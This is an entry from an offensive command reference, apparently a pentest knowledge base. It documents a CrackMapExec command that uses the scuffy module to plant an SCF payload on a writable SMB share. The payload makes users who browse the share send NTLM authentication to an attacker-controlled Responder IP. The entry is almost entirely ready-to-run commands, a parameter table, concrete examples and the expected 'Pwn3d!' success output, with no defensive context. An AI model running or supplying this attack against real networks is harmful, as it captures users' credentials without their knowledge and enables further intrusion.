---
id: b3d062f8-8ff9-4ff9-b2f7-0f609b505b0a
name: crackmapexec-smb-scf-payload
type: command
executor: bash
data: >-
  crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK
  SERVER=IP_RESPONDER
output: null
created_at: '2023-04-06T03:56:03.381547+00:00'
updated_at: '2023-04-10T20:26:21.390997+00:00'
platforms:
  - Linux
tags:
  - smb-exploitation
  - payload-deployment
verified: true
validated: true
---

# crackmapexec-smb-scf-payload

## Command

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD -M scuffy -o NAME=$_SHARE_NAME SERVER=$_RESPONDER_IP
```

## Description

Deploys an SCF payload to a writable SMB share using CrackMapExec's scuffy module, triggering remote icon loads for NTLM capture when browsed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target SMB server IP | Yes |
| -u $_USERNAME | Username for auth | Yes |
| -p $_PASSWORD | Password for auth | Yes |
| -M scuffy | SCF payload module | Yes |
| -o NAME=$_SHARE_NAME | Share/folder name for placement | Yes |
| SERVER=$_RESPONDER_IP | Attacker's Responder IP | Yes |

## Examples

### Basic Usage

```bash
crackmapexec smb 10.10.10.10 -u user -p pass -M scuffy -o NAME=WORK SERVER=192.168.1.100
```

### Advanced Usage

```bash
crackmapexec smb 10.10.10.10 -u user -p pass -M scuffy -o NAME=WORK SERVER=192.168.1.100 LHOST=192.168.1.100
```

## Expected Output

"SMB         10.10.10.10    445    DOMAIN          [+] username:password (Pwn3d!)" followed by payload deployment success.

## Related

- [[procedures/SCF-and-URL-File-Attack-Against-Writable-Share]]
- [[tools/CrackMapExec]]
